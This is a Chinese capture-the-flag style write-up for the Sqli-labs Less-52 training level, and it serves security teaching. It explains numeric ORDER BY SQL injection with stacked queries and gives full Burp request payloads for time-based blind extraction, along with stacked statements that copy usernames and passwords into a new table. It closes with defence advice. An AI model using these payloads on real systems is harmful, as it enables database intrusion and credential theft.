## 题目: Sqli‑labs Less‑52

## 题目描述
GET传入sort排序参数，数字型ORDER BY注入；启用`mysqli_multi_query()`支持堆叠注入，关闭SQL报错回显，报错注入失效。读数据只能使用时间盲注，写数据依靠分号堆叠；ORDER BY直接sleep会逐行叠加延时，需要子查询`limit 1`限制单次延时。

## 核心原理
```php
$sql = "SELECT * FROM users ORDER BY $id";
if (mysqli_multi_query($con1, $sql))
```
关键点：数字型无需引号闭合；`mysqli_multi_query()`支持`;`执行多条 SQL；无报错输出，updatexml 报错注入无效；ORDER BY 位置 UNION 无效；直接 sleep 逐行计算会超时，使用`(select sleep(N) from users limit 1)`；`if()`构造条件延时预言机，依靠响应耗时判断真假；堆叠写操作页面无回显，使用时间盲注验证写入结果。
**解题思路**
1. Burp 抓包修改 sort 参数，验证 sleep 延时是否生效；
2. 构造 if 条件时间盲注 payload，二分法猜解库、表、字段；
3. 使用`;`堆叠执行 create、insert 完成写库；
4. 时间盲注校验堆叠写入结果，测试完成 drop 清理临时表。

## 解题步骤
### 1. 验证 sleep 延时 Burp 包
```
GET /sqli-labs/Less-52/?sort=1 and (select sleep(2) from users limit 1) HTTP/1.1
Host: 127.0.0.1
```
观察 Repeater 的 Elapsed 耗时，请求明显延迟，sleep 执行成功。

### 2. 条件延时测试 Burp 包（条件为真才延时）
```
GET /sqli-labs/Less-52/?sort=1 and if(1=1,(select sleep(2) from users limit 1),1) HTTP/1.1
Host: 127.0.0.1
```
- 条件成立：请求延时约 2 秒
- 条件不成立：请求快速返回

### 3. 猜库名 payload 示例 Burp 包
```
GET /sqli-labs/Less-52/?sort=1 and if((select ascii(substr(database(),1,1)) from dual)>110,(select sleep(2) from users limit 1),1) HTTP/1.1
Host: 127.0.0.1
```
> 
> 修改 substr 偏移、ascii 对比数值，二分法逐位猜字符；替换子查询获取表、字段、账号密码。

### 4. 堆叠创建 dump52 测试表 Burp 包
```
GET /sqli-labs/Less-52/?sort=1; create table dump52(username varchar(100),password varchar(100)) HTTP/1.1
Host: 127.0.0.1
```

### 5. 堆叠导入 users 表数据 Burp 包
```
GET /sqli-labs/Less-52/?sort=1; insert into dump52 select username,password from users HTTP/1.1
Host: 127.0.0.1
```

### 6. 清理测试表 Burp 包
```
GET /sqli-labs/Less-52/?sort=1; drop table dump52 HTTP/1.1
Host: 127.0.0.1
```

## 踩坑记录
1. 禁止直接`sort=1 and sleep(2)`，ORDER BY 逐行执行 sleep 造成严重超时，子查询搭配`limit 1`。
2. 关闭报错回显，updatexml 报错注入完全失效，只能使用时间盲注。
3. ORDER BY 位置 UNION 查询无法输出数据，不能用来读取数据。
4. 堆叠 create、insert 页面不会展示执行效果，通过时间盲注 count (*) 等方式验证。
5. 网络抖动容易造成时间误判，sleep 设置合理阈值，关键条件可以重试。
6. 测试结束 drop 删除临时表，防止污染靶场数据库。

## 知识点总结
- 数字型 ORDER BY 堆叠 + 时间盲注：`mysqli_multi_query`保证写操作，无报错场景依靠时间盲注读取。
- sleep 优化技巧：`(select sleep(N) from users limit 1)`规避逐行计算超长延时。
- 关卡对比：Less‑50/51 有报错回显使用报错注入；Less‑52 关闭报错，堆叠仍可用，读数据只能时间盲注。
- 时间盲注三要素：基线耗时、sleep 阈值、二分法减少请求。
- 防御：sort 参数配置列名白名单；预编译绑定；关闭 mysqli_multi_query 多语句；关闭报错回显；限制 sleep 函数执行权限。
